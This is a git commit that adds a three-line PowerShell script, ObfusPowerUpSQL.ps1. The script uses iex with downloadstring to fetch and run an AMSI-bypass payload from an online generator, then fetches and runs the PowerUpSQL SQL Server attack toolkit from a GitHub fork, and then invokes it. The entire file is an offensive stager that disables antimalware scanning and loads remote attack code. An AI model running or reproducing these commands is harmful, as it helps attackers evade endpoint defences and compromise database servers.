c97bcfea6abd549e50849df5498ef03ab6e517d8
R0ckNRolla <makarenko.e.v@gmail.com>
2020-11-22 00:03:36 -0800

    Create ObfusPowerUpSQL.ps1

---
+++ ObfusPowerUpSQL.ps1
@@ -0,0 +1,3 @@
+iex(new-object net.webclient).downloadstring('https://amsi-fail.azurewebsites.net/api/Generate')
+iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/R0ckNRolla/PowerUpSQL/master/PowerUpSQL.ps1')
+PowerUpSQL
